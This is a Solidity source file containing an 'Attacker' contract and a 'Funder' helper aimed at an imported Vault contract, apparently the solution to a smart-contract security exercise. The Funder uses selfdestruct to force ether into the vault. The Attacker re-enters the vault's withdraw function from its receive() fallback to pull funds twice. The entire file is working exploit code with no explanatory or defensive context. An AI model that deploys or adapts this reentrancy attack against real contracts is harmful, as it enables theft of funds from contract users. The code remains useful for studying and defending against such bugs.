pragma solidity 0.8.12;

import "./Vault.sol";

contract Attacker {
    Vault target;
    address initiator;
    bool initiated;

    constructor(Vault target_) {
        target = target_;
    }

    function attack() external payable {
        initiator = msg.sender;

        new Funder{value: msg.value}(address(target));
         
        target.withdraw(1 ether, address(this), initiator);

    }

    receive() external payable {
        if (!initiated) {
            initiated = true;
            target.withdraw(1 ether, address(this), initiator);
        } else {
            initiated = false;
        }

    }
}


contract Funder {
    constructor(address receiver) payable {
        selfdestruct(payable(receiver));
    }
}
